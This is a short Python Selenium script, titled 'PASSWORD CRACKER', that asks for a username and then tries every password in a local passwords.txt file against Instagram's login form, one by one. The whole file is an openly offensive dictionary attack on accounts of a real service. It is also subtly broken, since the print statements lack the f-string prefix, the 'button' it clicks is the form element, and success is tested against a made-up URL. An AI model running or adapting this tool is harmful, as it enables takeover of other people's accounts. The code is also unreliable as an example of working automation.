from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time 
import getpass
print("****WELCOME TO PASSWORD CRACKER****")
username = input("enter username:-")
# Open the login page
driver = webdriver.Chrome()
driver.get("https://instagram.com/")


username_field = driver.find_element("name","username")
password_field = driver.find_element("name","password")
login_button = driver.find_element(By.ID,'loginForm')


with open('passwords.txt', 'r') as file:
   passwords = [line.strip() for line in file]


for password in passwords:    
    username_field.send_keys(username)
    password_field.send_keys(password)

   
    login_button.click()

    
    

   
    if 'successful_login_page' in driver.current_url:
        print("Login successful with password: {password}")
        break  
    else:
        print("Login unsuccessful with password: {password}")
        username_field.send_keys(Keys.CONTROL + "a")
        username_field.send_keys(Keys.DELETE)
        password_field.send_keys(Keys.CONTROL + "a")
        password_field.send_keys(Keys.DELETE)
    time.sleep(5)


driver.quit()
